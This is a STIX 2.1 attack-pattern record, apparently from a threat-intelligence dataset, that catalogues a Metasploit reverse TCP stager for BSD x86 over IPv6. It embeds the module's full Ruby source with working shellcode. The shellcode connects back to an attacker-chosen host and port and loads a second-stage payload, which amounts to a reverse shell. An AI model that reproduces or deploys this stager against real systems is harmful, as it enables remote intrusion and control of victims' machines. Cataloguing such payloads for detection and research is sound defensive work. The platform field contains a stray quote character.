{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a35c9741-e165-4f4a-8f16-ea040bea3693",
    "created": "2024-08-14T16:33:19.51597Z",
    "modified": "2024-08-14T16:33:19.515974Z",
    "name": "Reverse TCP Stager (IPv6)",
    "description": "Connect back to the attacker over IPv6",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/bsd/x86/reverse_ipv6_tcp.rb",
            "external_id": "reverse_ipv6_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n###\n#\n# ReverseTcp\n# ----------\n#\n# BSD reverse TCP stager.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 81\n\n  include Msf::Payload::Stager\n\n\n  def self.handler_type_alias\n    \"reverse_ipv6_tcp\"\n  end\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Reverse TCP Stager (IPv6)',\n      'Description'   => 'Connect back to the attacker over IPv6',\n      'Author'        =>  ['skape', 'vlad902', 'hdm'],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'bsd',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Stager'        =>\n        {\n          'Offsets' =>\n            {\n              'LHOST'    => [ 42, 'ADDR6' ],\n              'LPORT'    => [ 36, 'n'    ],\n              'SCOPEID'  => [ 58, 'V'    ]\n            },\n          'Payload' =>\n            \"\\x31\\xc0\\x50\\x40\\x50\\x6a\\x1c\\x6a\\x61\\x58\\x50\\xcd\\x80\\xeb\\x0e\\x59\" +\n            \"\\x6a\\x1c\\x51\\x50\\x97\\x6a\\x62\\x58\\x50\\xcd\\x80\\xeb\\x21\\xe8\\xed\\xff\" +\n            \"\\xff\\xff\\x1c\\x1c\\xbf\\xbf\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n            \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x6a\\x10\" +\n            \"\\x5a\\xc1\\xe2\\x08\\x29\\xd4\\x89\\xe1\\x52\\x51\\x57\\x51\\xb0\\x03\\xcd\\x80\" +\n            \"\\xc3\"\n        }\n      ))\n    register_options([\n      OptInt.new('SCOPEID', [false, \"IPv6 scope ID, for link-local addresses\", 0])\n    ])\n  end\nend\n",
    "x_mitre_platforms": [
        "bsd'"
    ]
}